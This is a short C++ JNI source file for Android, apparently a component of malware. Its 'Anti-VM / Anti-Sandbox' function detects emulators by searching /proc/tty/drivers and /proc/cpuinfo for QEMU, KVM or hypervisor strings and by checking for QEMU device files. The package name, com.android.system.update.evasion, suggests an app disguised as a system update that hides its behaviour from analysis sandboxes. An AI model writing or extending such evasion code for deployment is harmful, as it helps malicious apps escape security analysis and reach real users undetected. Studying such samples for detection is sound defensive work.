// 🔴 Anti-VM / Anti-Sandbox - Native Code
#include <jni.h>
#include <string>
#include <cpu-features.h>

extern "C" JNIEXPORT jboolean JNICALL
Java_com_android_system_update_evasion_AntiVMManager_isEmulator(JNIEnv* env, jobject) {
    // Cek QEMU
    FILE* fd = fopen("/proc/tty/drivers", "r");
    if (fd != NULL) {
        char buffer[1024];
        while (fgets(buffer, sizeof(buffer), fd)) {
            if (strstr(buffer, "qemu") != NULL) {
                fclose(fd);
                return true;
            }
        }
        fclose(fd);
    }
    
    // Cek file khas emulator
    const char* emulator_files[] = {
        "/system/bin/qemu-props",
        "/system/bin/qemu-ga",
        "/dev/socket/qemud",
        "/dev/qemu_pipe"
    };
    
    for (const char* file : emulator_files) {
        if (access(file, F_OK) == 0) {
            return true;
        }
    }
    
    // Cek CPU info
    fd = fopen("/proc/cpuinfo", "r");
    if (fd != NULL) {
        char buffer[1024];
        while (fgets(buffer, sizeof(buffer), fd)) {
            if (strstr(buffer, "hypervisor") != NULL ||
                strstr(buffer, "qemu") != NULL ||
                strstr(buffer, "kvm") != NULL) {
                fclose(fd);
                return true;
            }
        }
        fclose(fd);
    }
    
    return false;
}